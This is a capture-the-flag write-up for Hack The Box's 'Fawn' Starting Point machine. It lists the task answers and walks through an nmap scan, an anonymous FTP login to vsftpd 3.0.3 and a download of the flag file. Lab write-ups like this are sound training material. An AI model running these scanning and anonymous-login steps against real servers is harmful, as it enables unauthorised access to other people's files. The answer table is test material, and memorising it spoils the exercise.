# HTB — Fawn Writeup
**Platform:** Hack The Box  
**Track:** Starting Point — Tier 0  
**Difficulty:** Very Easy  
**OS:** Linux (Unix)  
**Service:** FTP (Port 21)

---

## Overview

Fawn is the second machine in HTB's Starting Point Tier 0 track. It introduces FTP enumeration and demonstrates how a misconfigured FTP server allowing anonymous login can lead to full file access. No password cracking or exploitation required — just anonymous access and basic FTP commands.

---

## Task Answers (Quick Reference)

| # | Question | Answer |
|---|----------|--------|
| 1 | What does the 3-letter acronym FTP stand for? | File Transfer Protocol |
| 2 | Which port does the FTP service listen on usually? | 21 |
| 3 | What acronym is used for the secure version of FTP? | SFTP |
| 4 | What command sends an ICMP echo request to test connection? | ping |
| 5 | From your scans, what version is FTP running on the target? | vsftpd 3.0.3 |
| 6 | From your scans, what OS type is running on the target? | Unix |
| 7 | What command displays the ftp client help menu? | ftp -h |
| 8 | What username allows anonymous FTP login? | anonymous |
| 9 | What FTP response code means "Login successful"? | 230 |
| 10 | What command (besides `dir`) lists files on the FTP server? | ls |
| 11 | What command downloads a file from the FTP server? | get |
| 12 | Submit root flag | *(found via `get flag.txt` then `cat flag.txt`)* |

---

## Enumeration

### Ping the target
```bash
ping -c 4 <TARGET_IP>
```

### Nmap scan
```bash
sudo nmap -sCV -p- --min-rate=1000 -oA fawn <TARGET_IP>
```

**Key result:**
```
21/tcp  open  ftp  vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed
Service Info: OS: Unix
```

Port 21 (FTP) is open, running **vsftpd 3.0.3**, and anonymous login is enabled.

---

## Exploitation

### Connect via FTP

```bash
ftp <TARGET_IP>
```

At the login prompt, use anonymous credentials:

```
Name: anonymous
Password: <anything or blank>
```

You should see response code **230** — login successful.

### List and download the flag

```ftp
ls
get flag.txt
exit
```

The file is downloaded to your current local directory.

### Read the flag

```bash
cat flag.txt
```

Copy the flag and submit it on the HTB portal.

> **Note:** If `get` fails, reconnect using `sudo ftp <TARGET_IP>`.

---

## Key Takeaways

- **FTP is unencrypted**: Credentials and data are sent in plaintext — use **SFTP** (port 22, SSH-based) for secure file transfers.
- **Anonymous FTP**: Many misconfigured FTP servers allow login with the username `anonymous` and any password. Always check for this during enumeration.
- **vsftpd**: Stands for "Very Secure FTP Daemon" — despite the name, it can still be misconfigured to allow anonymous access.
- **Nmap `-sCV`**: The `-sV` flag reveals service versions (e.g. vsftpd 3.0.3) and the `-sC` flag runs default scripts that detect anonymous FTP login automatically.

---

## Commands Cheatsheet

```bash
# Ping target
ping -c 4 <TARGET_IP>

# Nmap scan
sudo nmap -sCV -p- --min-rate=1000 -oA fawn <TARGET_IP>

# Connect to FTP
ftp <TARGET_IP>

# FTP commands (once logged in)
ls              # list files
dir             # list files (alternative)
get flag.txt    # download file
exit            # disconnect

# Read the flag
cat flag.txt
```